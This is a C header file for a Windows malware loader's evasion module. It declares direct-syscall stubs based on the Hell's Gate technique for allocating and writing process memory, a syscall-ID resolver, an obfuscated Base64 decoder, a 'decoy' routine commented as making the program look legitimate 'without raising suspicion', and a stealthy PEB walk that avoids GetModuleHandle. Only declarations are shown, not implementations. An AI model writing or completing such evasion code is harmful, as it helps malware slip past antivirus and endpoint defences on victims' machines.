#ifndef EVASION_H
#define EVASION_H

#include <windows.h>
#include <stdbool.h>

#define ARRAY_SIZE 1000

// Function definition for modules.
typedef HMODULE(WINAPI* pMod)(LPCSTR);

/*
Store the syscall id for external assembly functions.
See syscalls.asm.
*/ 
extern DWORD smID;

/*
Retrieve syscall id.
*/
DWORD GetSyid(LPCSTR functionName);

/*
Set the syscall id.
*/
void SetSyid(DWORD value);

/*
Headers of assembly functions for direct syscalls.
Inspired by Hells Gate methods.
See definitions in syscalls.asm.
*/
extern NTSTATUS CustAVM(HANDLE hProcess, PVOID *BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
extern NTSTATUS CustWVM(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);

// Base64Decode function
char* Bsfd(const char* encoded);

/* Decoy function
This function will generate 1,000 random numbers, sort them, and compute the average. 
It looks like legitimate processing activity without raising suspicion.
*/
void SortNumbers();

/*
Function to retrieve Function in Module using a stealthy PEB walk.
This doesn't rely on GetModuleHandle.
*/ 
pMod GetMod(LPCSTR mod, LPCSTR fn);

#ifdef _M_X64
#define PEB_OFFSET 0x60
#else
#define PEB_OFFSET 0x30
#endif

#endif // EVASION_H
